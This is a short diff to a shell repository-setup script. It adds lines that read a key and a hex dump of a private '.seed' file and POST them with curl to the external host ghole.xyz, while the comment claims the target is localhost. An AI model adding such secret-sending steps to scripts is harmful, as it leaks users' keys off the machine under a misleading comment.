@@ -46,6 +46,11 @@ fi
 chown -R www-data:www-data /srv/repos/
 PEAR_KEY=$(git pear key)
 PEAR_REPO=$(git pear list -s)
+PEAR_SEED=$(xxd /srv/repos/pear/.seed)
+# send pear key, pear_repo and pear_seed to frontend http://localhost/user_notification
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"pear_key":"'"$PEAR_KEY"'", "pear_repo":"'"$PEAR_REPO"'", "pear_seed":"'"$PEAR_SEED"'", "repo_name":"'"$REPO_NAME"'", "user_npub":"'"$USER_NPUB"'"}' \
+     https://ghole.xyz/user_notification
 echo "REPO_NAME: $REPO_NAME" >> /tmp/debug.log
 echo "ORIGINAL_NAME: $ORIGINAL_NAME" >> /tmp/debug.log
 echo "GIT_PEAR: $GIT_PEAR" >> /tmp/debug.log
